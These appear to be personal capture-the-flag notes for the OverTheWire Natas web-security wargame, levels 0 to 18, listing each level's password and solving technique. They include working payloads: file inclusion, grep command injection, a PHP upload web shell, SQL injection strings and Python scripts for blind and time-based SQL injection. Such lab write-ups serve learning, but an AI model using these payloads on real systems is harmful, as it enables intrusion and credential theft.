Level 0
access http://natas0.natas.labs.overthewire.org/ with natas0:natas0
F12 and see <!--The password for natas1 is g9D9cREhslqBKtcA2uocGHPfMZVzeFK6 --> in source  code

level1
access https://natas1.natas.labs.overthewire.org/ with natas1:g9D9cREhslqBKtcA2uocGHPfMZVzeFK6
didnt close F12 so see <!--The password for natas2 is h4ubbcXrWqsTo7GGnnUMLppXbOogfBZ7 --> directly

level2
access https://natas2.natas.labs.overthewire.org/ with natas2:h4ubbcXrWqsTo7GGnnUMLppXbOogfBZ7
from source code, found that there is a https://natas2.natas.labs.overthewire.org/files/pixel.png
then try accessing https://natas2.natas.labs.overthewire.org/files/, bingo, then open users.txt
got natas3:G6ctbMJ5Nb4cbFwhpMPSvxGHhQ7I6W8Q

level3
access http://natas3.natas.labs.overthewire.org/ with natas3:G6ctbMJ5Nb4cbFwhpMPSvxGHhQ7I6W8Q
from comment, it mentioned "Not even Google will find it"
googling "stop google from crawling website" and you will find it is about robots.txt or some http headers
check that no headers reveals password of level4, then search the robots.txt
then found Disallow: /s3cr3t/
access https://natas3.natas.labs.overthewire.org/s3cr3t/ then will find the users.txt again
got natas4:tKOcJIbzM4lTs8hbCmzn5Zr4434fGZQm

level4
access http://natas4.natas.labs.overthewire.org/ with natas4:tKOcJIbzM4lTs8hbCmzn5Zr4434fGZQm
website shows below message:
Access disallowed. You are visiting from "" while authorized users should come only from "http://natas5.natas.labs.overthewire.org/"
from last sentence, it looks like about header referer
but when i set Referer: http://natas5.natas.labs.overthewire.org/ in the request, it replies server timeout
it is because the request muse be sent to http://natas4.natas.labs.overthewire.org/index.php
got Z0NsrtIkJoKALBCLi5eqFfcRN82Au2oD

level5
access http://natas5.natas.labs.overthewire.org/ with natas5:Z0NsrtIkJoKALBCLi5eqFfcRN82Au2oD
got Access disallowed. You are not logged in
and then found that there is a response cookie loggedin=0
change it to loggedin=1 and refresh, got fOIvE0MDtPTgRhqmmvvAOt2EfXR6uQgR

level6
access http://natas6.natas.labs.overthewire.org/ with natas6:fOIvE0MDtPTgRhqmmvvAOt2EfXR6uQgR
there is a view sourcecode then we must read it, as below:
<?
include "includes/secret.inc";
    if(array_key_exists("submit", $_POST)) {
        if($secret == $_POST['secret']) {
        print "Access granted. The password for natas7 is <censored>";
    } else {
        print "Wrong secret";
    }
    }
?>
access http://natas6.natas.labs.overthewire.org/includes/secret.inc then got the secret as FOEIUWGHFEEUHOFUOIU
return to homepage and submit, got jmxSiH3SP6Sonf8dv66ng8v1cIEdjXWr

level7
access http://natas7.natas.labs.overthewire.org/ with natas7:jmxSiH3SP6Sonf8dv66ng8v1cIEdjXWr
there is home and about, and from comment there is <!-- hint: password for webuser natas8 is in /etc/natas_webpass/natas8 -->
you click either home or about, then will find it sets the query as the page name, looks like local file inclusion
access https://natas7.natas.labs.overthewire.org/index.php?page=/etc/natas_webpass/natas8
then got a6bZCNYwdKqN5cGP11ZdtPg0iImQQhAB

level8
access http://natas8.natas.labs.overthewire.org/ with natas8:a6bZCNYwdKqN5cGP11ZdtPg0iImQQhAB
got secret box and view source code again
<?
$encodedSecret = "3d3d516343746d4d6d6c315669563362";
function encodeSecret($secret) {
    return bin2hex(strrev(base64_encode($secret)));
}
if(array_key_exists("submit", $_POST)) {
    if(encodeSecret($_POST['secret']) == $encodedSecret) {
    print "Access granted. The password for natas9 is <censored>";
    } else {
    print "Wrong secret";
    }
}
?>
what we have to do is reverse it, grep an online php runner and try print base64_decode(strrev(hex2bin($encodedSecret)))
got Sda6t0vkOPkM8YeOZkAGVhFoaplvlJFd

level9
access http://natas9.natas.labs.overthewire.org/ with natas9:Sda6t0vkOPkM8YeOZkAGVhFoaplvlJFd
always view source code
<?
$key = "";
if(array_key_exists("needle", $_REQUEST)) {
    $key = $_REQUEST["needle"];
}
if($key != "") {
    passthru("grep -i $key dictionary.txt");
}
?>
type any word and then submit, and it will search the content in dictionary.txt for you
try search natas10, natas, password, ":" nothing special, then looks like we just inject "a users.txt"
"gerp -i a users.txt dictionary.txt" would grep both a in users.txt and dictionary.txt, but cant get the thing i want
try "a /etc/natas_webpass/natas10"
then got /etc/natas_webpass/natas10:D44EcsFkLxPIkAAKLosx8z3hxX1Z4MCE

level 10
access http://natas10.natas.labs.overthewire.org/ with natas10:D44EcsFkLxPIkAAKLosx8z3hxX1Z4MCE
similar to last one but filter special characters
<?
$key = "";

if(array_key_exists("needle", $_REQUEST)) {
    $key = $_REQUEST["needle"];
}

if($key != "") {
    if(preg_match('/[;|&]/',$key)) {
        print "Input contains an illegal character!";
    } else {
        passthru("grep -i $key dictionary.txt");
    }
}
?>
um...doesnt affect my solution, got /etc/natas_webpass/natas11:1KFqoJXi6hRaPluAmk8ESDW4fSysRoIg

level 11
access http://natas11.natas.labs.overthewire.org/ with natas11:1KFqoJXi6hRaPluAmk8ESDW4fSysRoIg
there is a cookie called data, and then a phrase in website "Cookies are protected with XOR encryption"
code is long. what it tries to do is read showpassword and bgcolor from cookie, if showpassword=yes, then show the password
there is a key in xor_encrypt
XOR is usually about xor the other side to get the key
original cookie is from base64_encode(xor_encrypt(json_encode(array( "showpassword"=>"no", "bgcolor"=>"#ffffff"))));
original cookie value is MGw7JCQ5OC04PT8jOSpqdmkgJ25nbCorKCEkIzlscm5oKC4qLSgubjY=
calculate base64_encode(json_encode(array( "showpassword"=>"no", "bgcolor"=>"#ffffff")));
plain cookie value is eyJzaG93cGFzc3dvcmQiOiJubyIsImJnY29sb3IiOiIjZmZmZmZmIn0=
plain XOR key = original => plain XOR original = key
Use CyberChef, base64 decode plain cookie value then XOR original, got key = KNHL
copy the xor_encrypt in php online runner with key = 'KNHL'
get a new cookie value by running base64_encode(xor_encrypt(json_encode(array( "showpassword"=>"yes", "bgcolor"=>"#ffffff"))));
update cookie and then refresh, be careful not to have query 
got YWqo0pjpcXzSIl5NMAVxg12QxeC1w9QG

level 12
access http://natas12.natas.labs.overthewire.org/ with natas12:YWqo0pjpcXzSIl5NMAVxg12QxeC1w9QG
read source code, can upload a file and then have the link of that file, looks like need to upload a php but failed
php content would be any file reading script like below
<?php
echo file_get_contents( "/etc/natas_webpass/natas13" ); // get the contents, and echo it out.
?>
read the code again, it is because frontend limited the extension to be .jpg, we need to intercept the request and change file ext to php
got lW3jYRI02ZKDBb8VtQBU1f6eDRo6WEj9

level 13
access http://natas13.natas.labs.overthewire.org/ with natas13:lW3jYRI02ZKDBb8VtQBU1f6eDRo6WEj9
similar to level 12 but this time it uses exif_imagetype to check if it is image ext
simply changing extension to .jpg doenst work now
when I try to search how to bypass exif_imagetype, i found others asking same question for overthewire...
https://stackoverflow.com/questions/18357095/how-to-bypass-the-exif-imagetype-function-to-upload-php-code
let's trick exif_imagetype
because Remote Code Execution is more useful, i uploaded the php code with command line accepting just like stackoverflow
then, first intercept the request and change file ext to php
and then intercept the file accessing request and add a query ?cmd=cat%20/etc/natas_webpass/natas14 
got qPazSJBmrmU7UQJv17MHk1PGC4DxZMEP

level 14
access http://natas14.natas.labs.overthewire.org/ with natas14:qPazSJBmrmU7UQJv17MHk1PGC4DxZMEP
view source code, it's time to do sql injection
  $query = "SELECT * from users where username=\"".$_REQUEST["username"]."\" and password=\"".$_REQUEST["password"]."\"";
easiest level, username and password being [" OR "1"="1]
got TTkaI7AWG4iDERztBcEyKV7kRXH1EZRB

level 15
access http://natas15.natas.labs.overthewire.org/ with natas15:TTkaI7AWG4iDERztBcEyKV7kRXH1EZRB
from source code, it seems need to write a script to loop the sql injection to brute force cracking password
$query = "SELECT * from users where username=\"".$_REQUEST["username"]."\"";
we want it to be SELECT * from users where username="natas15" and password like "A%", loop through A-Za-z0-9 and so on
at this moment we need a python script, but im not familiar to python...try burp suite first
enter [natas16" and password like "A%] in inputbox and submit
in burp suite, go to target tab, find the request, right click and send to intruder
go to Intruder tab, go to Positions, highlight the A in username's value and then click Add ยง, check that there is no other variable ยง
from source code, we could turn on debug mode to check the sql, let's add ?debug=1 in the url
go to Payloads, payload type choose brute forcer, character set enter ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789
got first different response length in T --> This user exists. sql SELECT * from users where username="natas16" and password like "T%"
but later found that t also got a match, find a keyword named BINARY to do case sensitive comparison
then we add the T in front of ยงAยง in Positions and dont need debug mode now
i admit, it is too slow...really need to write python script to do it
---                                  
#!/usr/bin/python3
import requests
import base64

s=requests.Session()
s.auth = ("natas15", "TTkaI7AWG4iDERztBcEyKV7kRXH1EZRB")
possibles="ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789"
password="dummy"
newpassword=""
while(password != newpassword):
    password=newpassword
    for char in possibles:
        result=s.post("http://natas15.natas.labs.overthewire.org/index.php", 
            data = {"username": "natas16\" and password like BINARY \"" + password + char + "%"});
        if "This user exists." in result.text:
            newpassword=password+char
            print(newpassword)
            break
---
got TRD7iZrd5gATjj9PkPEuaOlfEjHqj32V

level 16
access http://natas16.natas.labs.overthewire.org/ with natas16:TRD7iZrd5gATjj9PkPEuaOlfEjHqj32V
similar to level 10, but this time, got double quotes and more char checking
<?
$key = "";

if(array_key_exists("needle", $_REQUEST)) {
    $key = $_REQUEST["needle"];
}

if($key != "") {
    if(preg_match('/[;|&`\'"]/',$key)) {
        print "Input contains an illegal character!";
    } else {
        passthru("grep -i \"$key\" dictionary.txt");
    }
}
?>
because of the double quotes in passthru and the quotes checking in preg_match, we cant search the text in /etc/natas_webpass/natas17 and show result directly
but we could enter something like $(cat /etc/natas_webpass/natas17) to check the value in this file
similar to level 15, we could manipulate the search result of dictonary.txt to identify whether a character is in /etc/natas_webpass/natas17
for example, enter $(grep ! /etc/natas_webpass/natas17)dummy
if there is an ! in natas17 file, the final search will be searching !dummy, which doesnt exist in dictionary
if no ! in natas17 file, the final search is still searching dummy, which exists in dictionary
---                                  
#!/usr/bin/python3
import requests
import base64

s=requests.Session()
s.auth = ("natas16", "TRD7iZrd5gATjj9PkPEuaOlfEjHqj32V")
possibles="ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789"
password="dummy"
newpassword=""
while(password != newpassword):
    password=newpassword
    for char in possibles:
        result=s.get("http://natas16.natas.labs.overthewire.org/index.php?needle=$(grep ^" + password + char + " /etc/natas_webpass/natas17)dummy&submit=Search");
        if "dummy" not in result.text:
            newpassword=password+char
            print(newpassword)
            break
---
got XkEuChE0SbnKBvH1RU7ksIb9uuLmI7sd

level 17
access http://natas17.natas.labs.overthewire.org/ with natas17:XkEuChE0SbnKBvH1RU7ksIb9uuLmI7sd
similar to level 15, but this time there is no echo
when there is no different in content, mysql has a sleep function
we could add sleep(2) in query, like natas18" and password like "A%" and sleep(2) and password like "A%
it times out and returns different answers so many times...two findings:
1) sleep(2) isnt enough, because the processing time maybe from server itself
2) if it timeout in the middle, start next searching from the known part of the password. If it stopped in the middle, remove last few chars from the known password
---code---
#!/usr/bin/python3
import requests
import base64

s=requests.Session()
s.auth = ("natas17", "XkEuChE0SbnKBvH1RU7ksIb9uuLmI7sd")
possibles="ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789"
password="dummy"
#newpassword=""
newpassword="8NEDUU"
while(password != newpassword):
    password=newpassword
    for char in possibles:
        result=s.post("http://natas17.natas.labs.overthewire.org/index.php", 
            data = {"username": "natas18\" and if(password like BINARY \"" + password + char + "%\", sleep(5), 1) and \"1\"=\"1"});

        if result.elapsed.seconds >= 5:
            newpassword=password+char
            print(newpassword)
            break
---
got 8NEDUUxg8kFgPV84uLwvZkGn6okJQ6aq

level 18
access http://natas18.natas.labs.overthewire.org/ with natas17:8NEDUUxg8kFgPV84uLwvZkGn6okJQ6aq
